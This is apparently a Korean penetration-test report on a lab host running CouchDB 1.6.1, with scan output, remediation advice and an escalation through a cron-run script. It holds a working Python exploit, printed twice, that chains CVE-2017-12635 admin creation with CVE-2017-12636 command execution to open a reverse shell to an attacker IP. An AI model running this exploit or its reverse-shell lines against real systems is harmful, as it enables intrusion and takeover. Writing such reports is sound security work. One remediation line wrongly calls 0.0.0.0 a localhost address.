
## 목차

1. 개요
    1. 총평
    2. 진단 결과 요약

2. 모의해킹 수행 내용
    1. 정보 수집
    2. 취약점 공격과 도커 인스턴스 초기 침투
    3. 호스트 초기 침투
    4. 권한 상승

3. 취약점 및 대응 방안
    1. 불필요한 서비스 제거 - CouchDB
    2. 웹서비스 불필요한 파일 제거
    3. 불충분한 인증 - 회원가입
    4. 불충분한 인가 - DB
    5. cron 파일 소유자 및 권한설정
    6. 숨겨진 파일 및 디렉토리 제거



## 개요

### 총평

| **분석 기간**                   | **호스트 이름** | **IP주소**  | **목적**            |
| --------------------------- | ---------- | --------- | ----------------- |
| 2024년 7월 27일 ~ 2024년 7월 28일 | Host2      | 10.0.4.22 | 보안 취약점 진단 및 침투테스트 |

본 보고서는 2024년 7월 27일부터 28일까지 진행된 Host2 호스트에 대한 모의해킹 작업을 요약한다. 이 과정에서 발견된 취약점과 그에 따른 침투 테스트 결과를 중점적으로 다룬다.

포트 스캔 결과, DB서버의 포트가 로컬호스트에서 실행 중이 아닌, 외부에 접근이 가능하도록 열려 있는 상태이다. 또한 해당 CouchDB서버 1.6.1 버전은 10년 가까이 보안 업데이트가 되지 않아, 원격 코드를 실행할 수 있는 심각한 취약점이 존재하므로 신속한 조치가 필요하다. 이를 악용하는 공격자는 DB서버에 접속하여 관리자 권한 유저를 생성할 수 있으며, 해당 관리자 권한을 이용해 원격 명령 실행을 유도할 위험이 존재한다. 

임의의 공격자 서버의 포트로 리버스쉘을 획득함으로써 도커 환경으로 네트워크 접근이 가능하다. 해당 DB서버는 도커 환경임에도 불구하고 민감한 계정 정보를 노출시켜놓았기 때문에 파일을 확인한 공격자는 실제 DB서버 호스트에 접근할 수 있다.

낮은 권한의 유저에게 /etc/crontab 파일에 대해 불필요하게 읽기 권한을 부여되고 있으므로 공격자는 파일 내용을 확인할 수 있다. root 권한을 이용해 반복적으로 파일을 실행하는 사실을 확인한 공격자는 악성 파일을 업로드 후, root 권한 상승 및 장악이 가능하다. 

인터넷에 노출되어 있는 호스트의 특성상 점검자는 취약점을 발견한 즉시 RedRaccoon사의 보안 담당자에게 연락해 취약점 정보를 제공했다.

### 진단 결과 요약

아래 표는 이번 모의해킹 과정에서 발견된 주요 취약점을 요약한 것이다. 각 취약점에 대한 자세한 설명 및 대응 방안은 본 보고서의 '취약점 및 대응 방안' 섹션에서 확인할 수 있다.

| 번호  | 이름                 | 중요도 | 설명                                                        | 대응 방안                                                                  |
| --- | ------------------ | --- | --------------------------------------------------------- | ---------------------------------------------------------------------- |
| 1   | 불필요한 서비스 제거        | 상   | 데이버베이스 서버의 포트가 외부에 열려있어 공격자가 서버에 접근 및 로그인 시도 가능           | 공격자가 해당 포트를 스캐닝도 못하도록 방화벽 필터링 대응 또는 및 로컬호스트로 구동하여 로컬 관리자만 접속할 수 있도록 대응 |
| 2   | 웹서비스 불필요한 파일 제거    | 상   | Ubuntu Apache2 기본페이지 노출 설정으로 인해, 실제 경로 및 파악 및 접근 가능       | 기본으로 생성되는 불필요한 파일 및 디렉토리 제거                                            |
| 3   | 불충분한 인증            | 상   | 회원가입 과정에서 인증 로직의 문제로 임의의 관리자 계정 추가 및 권한 이용 가능             | 취약점이 제거된 최신 버전의 서버로 패치                                                 |
| 4   | 불충분한 인가<br>        | 상   | 관리자 권한으로 데이터베이스 내에 시스템 명령어를 추가하여 원격 코드 실행 유도가능            | 취약점이 제거된 최신 버전의 서버로 패치                                                 |
| 5   | cron 파일 소유자 및 권한설정 | 상   | 낮은 권한 유저가 시스템의 crontab 파일을 읽고, 임의의 악성 파이썬 코드 실행 및 권한상승 가능 | 낮은 권한의 유저의 crontab 설정 파일 읽기 권한 제거, 또는 root 권한으로의 cron 실행 제거            |
| 6   | 숨겨진 파일 및 디렉토리 제거   | 하   | 민감한 계정 정보 파일의 노출하여 계정을 이용한 권한 상승 가능                       | 해당 민감한 파일을 파일 시스템에 남겨놓지 않고 경로에서 제거                                     |




## 모의해킹 수행 내용

### 정보 수집 - 포트스캐닝

대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.

```
# nmap -p- --max-retries 1 -sS -Pn -n -oA overallscan 10.0.4.22

Nmap scan report for 10.0.4.22
Host is up (0.00023s latency).
Not shown: 65532 closed tcp ports (reset)

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5984/tcp open  couchdb
            
```


해당 열린 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.

```
# nmap -p 22,80,5984 -sV -sC -Pn -n -oA detailed 10.0.4.22
Nmap scan report for 10.0.4.22
Host is up (0.00012s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8f:ae:80:ed:4c:94:95:82:40:e8:1a:09:2f:a2:5e:68 (ECDSA)
|_  256 05:0c:2e:cd:15:4b:d9:2b:ed:6a:8f:27:45:dd:14:bb (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/17)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/17)
MAC Address: 0A:66:B8:56:3F:7B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

포트 스캔 결과, 리눅스 우분투환경에서 포트 22에서는 OpenSSH 8.9p1 가 실행중이며 기본적으로 버전 7.7 이상이기 때문에 유저 정보수집 취약점이 없을 것이라고 예측해 볼 수 있다. , 포트 80에서는 아파치 웹서버가 실행중이였으며, 포트 5984에서는 CouchDB 데이터베이스 서버가 실행중이였다. 데이터베이스 서버를 외부에 포트를 열어놓은 상태이므로 직접 접근하여 로그인 및 공격을 시도해볼 수 있다. 


### 정보 수집 - SSH

정말 유저 정보 수집 취약점이 없는지, 다른 취약점은 있는지 재확인하기 위해 `searchsploit`을 통해 알려진 취약점이 있는지 확인한다. 인터넷 검색을 통해서도 확인하였으나 심각한 취약점이 발견되지 않았다.
![](Pasted%20image%2020240728101558.png)


### 정보 수집 - 웹

기초적인 웹 정보 수집을 위해 포트 80을 방문하니 Apache2 기본 페이지를 확인할 수 있다. 해당 파일을 랜딩페이지로 유지한다면 공격자는 설정 파일 및 웹루트 경로(`/var/www/html`) 등 실제 경로를 쉽게 추측할 수 있다. 서버의 버전 정보는 물론 관련 취약점까지 확인 후 2차 공격을 시도할 수 있다.
![](Pasted%20image%2020240728075104.png)


### 정보 수집 - DB서버

CouchDB 1.6.1 버전은 2014년에 출시된 버전이며, 이 후 새로운 업데이트가 되지 않은 상태이므로 보안상 심각한 취약점이 존재할 가능성이 크다.


`searchsploit` 및 인터넷 검색을 통해 알려진 취약점 찾은 결과, 관리자 권한 계정 생성 및 원격 명령을 실행할 수 있는 취약점이 존재했다.
![Pasted image 20240728063533](Pasted%20image%2020240728063533.png)



### 취약점 공격과 도커 인스턴스 초기 침투


- 취약점 1. 관리자 권한 계정 생성 - `CVE-2017-12635`

해당 취약점은 허용되지 않은 공격자가 임의로 관리자 권한의 사용자를 추가할 수 있는 취약점이다.

일반적으로  `_admin` 권한으로 회원가입 시도 시, 권한이 없다고 실패하는 것을 확인할 수 있다. 
![Pasted image 20240728064917](Pasted%20image%2020240728064917.png)

```
{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "password": "vulhub"
}
```


하지만 아래와 같이 이중으로 요청을 보낼 시, 관리자 권한으로의 가입이 성공하는 것을 확인할 수 있다.
![Pasted image 20240728065242](Pasted%20image%2020240728065242.png)

```
{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```


실제로 `/_utils/` 에 접속해, 관리자 계정으로 정상적인 로그인이 가능함을 확인한다.
![Pasted image 20240728065611](Pasted%20image%2020240728065611.png)


- 취약점 2. 원격 명령어 실행 - `CVE-2017-12636`
이 후, 관리자 계정을 이용하여 원격 명령어 실행을 유도하기 위해 데이터베이스 내에 명령어를 추가하는 요청을 보낸 후, 유도한다.

해당 파이썬 PoC을 분석 및 변수 값을 변경시켜 리버스 쉘을 받아온다. 이 때, 사전에 공격자 서버의 5454 포트를 열어 놓는다.   
![Pasted image 20240728070201](Pasted%20image%2020240728070201.png)
```python
#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

target = 'http://10.0.4.22:5984'
command = rb"""sh -i >& /dev/tcp/10.0.4.25/5454 0>&1"""
version = 1

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(target + '/_users/org.couchdb.user:vulnhub', data='''{
  "type": "user",
  "name": "vulnhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulnhub"
}''')

session.auth = HTTPBasicAuth('vulnhub', 'vulnhub')

command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

session.put(target + '/vulnhub')
session.put(target + '/vulnhub/test', data='{"_id": "vulnhubtest"}')

if version == 1:
    session.post(target + '/vulnhub/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/vulnhub/_design/test', data='{"_id":"_design/test","views":{"vulnhub":{"map":""} },"language":"cmd"}')
```


공격자 서버에서 정상적으로 리버스쉘을 받아옴으로써, 피해자의 네트워크에 접근이 가능함을 확인한다
![Pasted image 20240728072253](Pasted%20image%2020240728072253.png)



### 호스트 초기 침투

하지만 `hostname` 출력값이나 `/.dockerenv` 파일이 존재함 등을 확인해봤을 때, 현재 도커 내에 있음을 확인할 수 있다. 

도커를 빠져나오는 부분은 까다로운 조건과 기술적인 복잡성이 요구되기 때문에, 루트 권한으로의 상승을 시도하지 않고, 해당 유저의 권한으로 파일 서비스를 탐색하여, 계정 정보 및 중요 정보들을 수집한다.
![Pasted image 20240728072453](Pasted%20image%2020240728072453.png)


base64 로 인코딩 되어있는 `.creds` 파일을 디코딩할 시, 평문으로 `dmzdbadmin : <REDACTED>` 유저의 계정 정보를 확인할 수 있으며 SSH으로 해당 계정에 접근이 가능하다.
![Pasted image 20240728072857](Pasted%20image%2020240728072857.png)


### 권한 상승

`/etc/crontab` 파일을 확인했을 때, 루트권한으로 `/opt/backup/continuous-back.py` 경로의 파이썬 파일을 반복적으로 실행함을 확인한다.
![Pasted image 20240728073631](Pasted%20image%2020240728073631.png)


해당 파일의 파이썬 코드를 확인 했을 때, `/tmp/cleanup.py` 파일을 1분마다 반복적으로 실행하고 있다.  
![Pasted image 20240728073722](Pasted%20image%2020240728073722.png)


`/tmp` 디렉토리에는 모든 유저의 쓰기 권한이 있기 때문에 이를 악용하여 `cleanup.py` 이름으로 파이썬 리버스쉘을 작성한다. 이 후 사전에 열어놓은 공격자 서버 4455 포트로 루트 권한을 획득한다.
![Pasted image 20240728074335](Pasted%20image%2020240728074335.png)

root 권한으로 설정된 쉘을 획득했다. 이 권한 상승을 통해 Host2 의 제어권을 확보했고, 모의 침투 테스트는 여기서 마무리됐다. 테스트 과정에서 발견된 취약점들은 다음 섹션에 문서화했다.



## 취약점 및 대응 방안
### 1. 불필요한 서비스 제거 - CouchDB

#### 취약점 개요

| 정보          | 설명                             |
| ----------- | ------------------------------ |
| 이름          | 불필요한 서비스 제거 - CouchDB          |
| 중요도         | 상                              |
| 위치          | 서비스: CouchDB 1.6.1<br>포트: 5984 |

#### 취약점 설명

정보 수집단계에서 nmap 스캔 시, 데이버베이스 서버의 포트가 외부에 열려 있는 상태이다. 접근가능한 DB서버가 존재함을 확인한 공격자는 해당 서버의 버전 및 정보를 확인 후 해당하는 취약점을 이용해 2차공격을 시도할 가능성이 높다. 또한 공격자가 DB 서버에 직접 접속 및 로그인 시도가 가능하다.


#### 대응 방안

DB서버는 특히 민감한 정보가 많이 위치해 있기 때문에, 공격자가 해당 포트를 스캐닝하여 정보 수집을 할 수 없도록 한다.
외부에 포트를 열어놓기보다는 로컬호스트의 유저만 이용할 수 있도록 하는 것을 권장한다. 이를 위해 설정 파일에서 로컬호스트 IP 주소의 접속만 허용한다.
만약 외부로 열어놓는 서버 구동이 불가피한 경우, 특정 IP 주소만 접속을 허락하고, 그 외의 IP주소는 필터링 할 수 있도록 방화벽 룰을 설정할 수 있다.


```
# CouchDB 설정 파일 경로
/var/lib/docker/overlay2/bc02bf843952f8592ffd5b4010721f53677994d25ee5d83e71a872f1df0f7f12/merged/usr/local/etc/couchdb/default.ini

# default.ini 
port = 5984                  
bind_address = 0.0.0.0
```

`bind_address` IP 주소 값을 로컬호스트 주소인 0.0.0.0에서 127.0.0.1 로 변경한다.



설정을 완료 후 도커 컨테이너를 재시작하여 설정을 적용시킨다.
```
docker restart <CONTAINER ID>
```


해당 포트에 대해 nmap 핑 및 스캔이 불가능함을 확인한다.
```
# ATTACKER
nmap -p 5984 -sn 10.0.4.22
```



### 2. 웹서비스 불필요한 파일 제거

#### 취약점 개요

| 정보          | 설명                                                        |
| ----------- | --------------------------------------------------------- |
| 이름          | 웹서비스 불필요한 파일 제거                                           |
| 중요도         | 상                                                         |
| 위치          | URL: http://10.0.4.22/<br>파일 경로: /var/www/html/index.html |

#### 취약점 설명

Ubuntu Apache2 기본페이지를 제거하지 않고 남겨두었으므로, 공격자는 OS 및 웹서버 정보 수집 후 관련 버전의 취약점을 찾아 2차 공격을 시도할 가능성이 높다. 또한 실제 경로 파악 및 접근 가능하다.
해당 기본 페이지를 랜딩페이지로 유지한다면 공격자는 설정 파일 및 웹루트 경로( `/var/www/html`) 등 실제 경로를 쉽게 추측할 수 있다.


#### 대응 방안

웹서버를 설치할 때, 기본으로 생성되는 불필요한 파일 및 디렉토리는 제거 후 자체 제작한 랜딩페이지를 사용한다.
삭제할 기본 페이지 경로: `/var/www/html/index.html`


### 3. 불충분한 인증 - 회원가입

#### 취약점 개요

| 정보          | 설명                                                                                                               |
| ----------- | ---------------------------------------------------------------------------------------------------------------- |
| 이름          | 불충분한 인증 - 회원가입                                                                                                   |
| 중요도         | 상                                                                                                                |
| 위치          | URL: http://10.0.4.22:5984/_users/org.couchdb.user:vulhub<br>POST 요청 파라미터: `roles`<br>취약 서비스 및 버전: CouchDB 1.6.1 |


#### 취약점 설명

관리자 권한 계정 생성 - `CVE-2017-12635`
해당 취약점은 허용되지 않은 공격자가 임의로 관리자 권한의 사용자를 추가 할 수 있는 취약점이다.

회원가입 과정에서 인증 로직의 문제로 `roles` 파라미터 값을 아래와 같이 이중으로 요청을 보낼 시, 관리자 권한으로 가입이 가능하다. 

```
{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```


결과적으로로 관리자 권한으로 데이터 생성, 편집 등 기능 이용이 가능하다.



#### 대응 방안

CouchDB 1.6.1 버전의 출시일은 2014년이며, 나온지 10년 정도 보안 패치가 되지 않은 상태이기 때문에 이러한 심각한 취약점이 발견됐다. 취약점이 제거된 최신 버전의 서버로 업데이트할 것을 권고한다.

CouchDB 3.3.3 버전 (2023년 출시) - [Link](https://docs.couchdb.org/en/latest/whatsnew/3.3.html#version-3-3-3) 




### 4. 불충분한 인가 - DB

#### 취약점 개요

| 정보          | 설명                                                                                                                   |
| ----------- | -------------------------------------------------------------------------------------------------------------------- |
| 이름          | 불충분한 인가 - DB                                                                                                         |
| 중요도         | 상                                                                                                                    |
| 위치          | URL: http://guest:guest@10.0.4.22:5984/_config/query_servers/cmd<br>POST 요청 파라미터: `id`<br>취약 서비스 및 버전: CouchDB 1.6.1 |


#### 취약점 설명

관리자 권한 계정 생성 - `CVE-2017-12636`
관리자 권한을 이용하여 데이터베이스 내에 시스템 명령어를 추가하여 원격 명령어 실행을 유도할 수 있는 취약점이다.

원격 명령어 실행을 유도하기 위해 데이터베이스 내에 임의의 명령어를 추가하는 요청을 보낸 후, 유도한다.

결국 공격자는 원격으로 공격자 서버로 리버스 쉘을 받아와 임의의 명령어 실행 및 초기 침투가 가능하다.

- PoC
```python
#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth

target = 'http://10.0.4.22:5984'
command = rb"""sh -i >& /dev/tcp/10.0.4.25/5454 0>&1"""
version = 1

session = requests.session()
session.headers = {
    'Content-Type': 'application/json'
}
# session.proxies = {
#     'http': 'http://127.0.0.1:8085'
# }
session.put(target + '/_users/org.couchdb.user:vulnhub', data='''{
  "type": "user",
  "name": "vulnhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulnhub"
}''')

session.auth = HTTPBasicAuth('vulnhub', 'vulnhub')

command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
if version == 1:
    session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
else:
    host = session.get(target + '/_membership').json()['all_nodes'][0]
    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

session.put(target + '/vulnhub')
session.put(target + '/vulnhub/test', data='{"_id": "vulnhubtest"}')

if version == 1:
    session.post(target + '/vulnhub/_temp_view?limit=10', data='{"language":"cmd","map":""}')
else:
    session.put(target + '/vulnhub/_design/test', data='{"_id":"_design/test","views":{"vulnhub":{"map":""} },"language":"cmd"}')
```


#### 대응 방안

CouchDB 1.6.1 버전의 출시일은 2014년이며, 나온지 10년 정도 보안 패치가 되지 않은 상태이기 때문에 이러한 심각한 취약점이 발견됐다. 취약점이 제거된 최신 버전의 서버로 업데이트할 것을 권고한다.

CouchDB 3.3.3 버전 (2023년 출시) - [Link](https://docs.couchdb.org/en/latest/whatsnew/3.3.html#version-3-3-3) 




### 5. cron 파일 소유자 및 권한설정

#### 취약점 개요

| 정보          | 설명                  |
| ----------- | ------------------- |
| 이름          | cron 파일 소유자 및 권한설정  |
| 중요도         | 상                   |
| 위치          | 파일 경로: /etc/crontab |


#### 취약점 설명

관리자가 아닌 낮은 권한의 유저가 시스템의 `/etc/crontab` 파일을 읽을 수 있으며,
실행 중인 반복 작업을 확인할 수 있다. 실행되는 해당 파일이 수정 가능하다면, 임의의 악성 파이썬 코드 실행이 가능하다.

결국 공격자는 root 권한으로 파이썬 코드를 실행시켜 권한상승까지 가능했다.


#### 대응 방안

crontab 파일을 아무나 열람하지 못하도록 권한을 변경한다.
또한 해당하는 .py  파일도 누구나 열람하지 못하도록 하는 것을 권장한다.

```
chmod 600 /etc/crontab
```



### 6. 숨겨진 파일 및 디렉토리 제거

#### 취약점 개요

| 정보  | 설명                            |
| --- | ----------------------------- |
| 이름  | 숨겨진 파일 및 디렉토리 제거              |
| 중요도 | 하                             |
| 위치  | 파일 경로: `/home/couchdb/.creds` |


#### 취약점 설명

couchdb 도커 환경에 민감한 계정 정보가 들어있는 `.creds` 파일이 존재했다. 해당 파일은 누구에게나 읽기 권한이 있었기 때문에, 해당 정보를 이용하여 다른 사용자로 SSH 접근할 수 있었다.

#### 대응 방안

`.creds` 파일을 해당 낮은 권한 유저의 홈 디렉토리에 두는 것은 쉽게 확인 후, 악용이 가능하므로 파일을 지워 대응한다.

```
rm -rf .creds
```

이러한 민감한 계정 정보를 파일시스템에서 제거하는 것이 어렵고 꼭 사용해야한다면, 
소유자 권한 이외에는 아무나 읽을 수 없도록 파일의 읽기 권한을 변경하는 것이 좋다.

```
chmod 600 .creds
```
